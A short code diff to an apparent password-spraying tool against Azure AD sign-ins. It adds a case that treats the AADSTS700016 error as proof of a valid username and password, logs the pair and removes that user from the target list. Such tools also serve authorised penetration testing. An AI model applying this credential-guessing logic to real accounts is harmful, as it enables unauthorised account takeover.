@@ -380,6 +380,15 @@ for pindex, password in enumerate(passwords):
                 results_list.append(f"{username}:{password}")
                 usernames.remove(username)
 
+            elif "AADSTS700016" in error:
+                # Application not found in directory (probably because random-generated uuid above)
+                print(
+                    f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
+                )
+                results += f"{username} : {password}\n"
+                results_list.append(f"{username}:{password}")
+                usernames.remove(username)
+
             else:
                 # Unknown errors
                 print(f"Got an error we haven't seen yet for user {username}")
